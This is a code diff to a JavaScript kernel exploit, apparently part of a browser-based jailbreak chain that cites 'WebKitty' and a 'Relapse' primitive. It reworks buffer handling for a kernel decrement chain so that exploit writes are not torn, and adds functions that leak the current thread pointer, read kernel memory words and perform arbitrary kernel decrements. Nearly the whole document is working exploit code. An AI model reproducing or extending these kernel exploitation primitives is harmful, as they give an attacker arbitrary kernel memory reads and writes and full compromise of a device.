@@ -136,6 +136,11 @@ let kernel_base = undefined;
 
 let pr_main_core = undefined;
 let pr_worker_cores = [];
+
+// WebKitty keeps every scratch ArrayBuffer reachable for the whole exploit.
+// Chain/counter buffers are read and written directly through typed-array
+// views; never let GC move or reclaim them while the kernel walks them.
+const pr_keepalive = [];
 //#endregion
 
 //#region Basic helpers
@@ -413,14 +418,24 @@ function pr_spray_rthdrs() {
 
 function pr_chain_new(n) {
   if (n <= 0) throw new Error('Empty Relapse chain !!');
-  const addr = mem.alloc(PR_NODE_SZ * n);
-  mem.bset(addr, PR_NODE_SZ * n, 0);
-  return { addr, n };
+
+  // Real ArrayBuffer, as in WebKitty. The shared arw.view() victim is mutable
+  // global state: its two-word master pointer update and its reads can be
+  // observed stale while the kernel is concurrently walking the chain.
+  const ab = new ArrayBuffer(PR_NODE_SZ * n);
+  pr_keepalive.push(ab);
+  return {
+    ab,
+    dv: new DataView(ab),
+    f64: new Float64Array(ab),
+    addr: pr_buf_addr(ab),
+    n,
+  };
 }
 
 function pr_chain_link(chain, i, dec, sink, last = false) {
   const o = i * PR_NODE_SZ;
-  const v = arw.view(chain.addr);
+  const v = chain.dv;
   v.setBInt(o + 0x00, pr_bi(dec), true);
   v.setBInt(o + 0x08, pr_bi(sink), true);
   v.setBInt(o + 0x10, pr_mutex, true);
@@ -667,7 +682,6 @@ function pr_oracle(addr, n, label) {
     const m = pr_counter(obs);
     return { m, v: m > 0 ? n - m + 1 : 0 };
   } finally {
-    mem.free(chain.addr);
     mem.free(obs);
   }
 }
@@ -713,7 +727,6 @@ function pr_sweep_byte(step, probe, low, label) {
     }
     return pr_decode_sweep(obs_str, low);
   } finally {
-    mem.free(chain.addr);
     mem.free(obs);
   }
 }
@@ -779,7 +792,6 @@ function pr_multi_fire(jobs, label) {
     }
     return out;
   } finally {
-    mem.free(chain.addr);
     mem.free(obs);
   }
 }
@@ -791,11 +803,7 @@ function pr_dec_many(targets) {
   for (let i = 0; i < targets.length; i++) {
     pr_chain_link(chain, i, targets[i], pr_dummy);
   }
-  try {
-    pr_run_chain(chain, 'dec');
-  } finally {
-    mem.free(chain.addr);
-  }
+  pr_run_chain(chain, 'dec');
 }
 
 function arb_dec(target, count) {
@@ -812,9 +820,16 @@ function pr_worker_cancel(i, ids, n, out) {
 }
 
 async function pr_leak_curthread() {
-  const ctr = mem.alloc(0x40);
-  arw.view(ctr).setInt32(0x00, 0x40000000, true);
-  arw.view(ctr).setInt32(0x10, 0x40000000, true);
+  // Direct typed-array counter, as in WebKitty. Reading the walk progress
+  // through arw.view() during the live kernel walk returned stale values and
+  // made the cut land at the wrong node.
+  const ctr_ab = new ArrayBuffer(0x40);
+  pr_keepalive.push(ctr_ab);
+  const ctr_u32 = new Uint32Array(ctr_ab);
+  ctr_u32[0] = 0x40000000;
+  ctr_u32[0x10 / 4] = 0x40000000;
+  const ctr = pr_buf_addr(ctr_ab);
+  const ctr_walked = () => (0x40000000 - ctr_u32[0]) >>> 0;
 
   const chain = pr_chain_new(PR_N_LEAK);
   for (let i = 0; i < PR_N_LEAK; i++) {
@@ -865,15 +880,16 @@ async function pr_leak_curthread() {
   // WebKitty cuts the chain ahead of the walking pointer before it awaits the
   // worker cancel. Without this, the decrement walk can continue past the
   // leaked curthread write and corrupt unrelated kernel memory.
-  const drop = pr_counter(ctr, 0);
+  const drop = ctr_walked();
   let cut_at = -1;
   for (let m = PR_CUT_MARGIN; m <= PR_CUT_MARGIN << 3; m <<= 1) {
-    const at = pr_counter(ctr, 0) + m;
+    const at = ctr_walked() + m;
     if (at >= PR_N_LEAK - 1) break;
-    // Single 8-byte store. setBInt() emits two 32-bit stores; a concurrent
-    // kernel walk can observe a torn pointer (new low half, old high half).
-    arw.view(chain.addr.add(at * PR_NODE_SZ + 0x30)).setFloat64(0, 0, true);
-    if (pr_counter(ctr, 0) < at) {
+    // Single 8-byte store through the chain's own Float64Array, exactly as
+    // WebKitty does. setBInt() emits two 32-bit stores; a concurrent kernel
+    // walk can observe a torn pointer (new low half, old high half).
+    chain.f64[at * (PR_NODE_SZ / 8) + 0x30 / 8] = 0;
+    if (ctr_walked() < at) {
       cut_at = at;
       break;
     }
@@ -889,9 +905,6 @@ async function pr_leak_curthread() {
 
   pr_reap_arm(chain);
   logger.debug('Relapse leak reaped !!');
-
-  mem.free(chain.addr);
-  mem.free(ctr);
 
   if (hits === 0 || hit_hi < 0xffff0000 || samples.size !== 1) {
     throw new Error(
@@ -935,13 +948,8 @@ async function pr_read_low_dword(target) {
     pr_chain_link(chain, i++, X1.add(posA[j]), DUM, j === posA.length - 1);
   }
 
-  let mA;
-  try {
-    pr_run_chain(chain, 'passA');
-    mA = pr_counter(SNK);
-  } finally {
-    mem.free(chain.addr);
-  }
+  pr_run_chain(chain, 'passA');
+  const mA = pr_counter(SNK);
   if (mA <= 0) throw new Error('Relapse passA found no crossing !!');
 
   const kA = PR_KA - mA + 1;
@@ -965,13 +973,8 @@ async function pr_read_low_dword(target) {
     pr_chain_link(chain, i++, X2.add(posB[j]), DUM, j === posB.length - 1);
   }
 
-  let mB;
-  try {
-    pr_run_chain(chain, 'passB');
-    mB = pr_counter(SNK);
-  } finally {
-    mem.free(chain.addr);
-  }
+  pr_run_chain(chain, 'passB');
+  const mB = pr_counter(SNK);
   if (mB <= 0) throw new Error('Relapse passB found no crossing !!');
 
   const r = PR_KB - mB + 1;
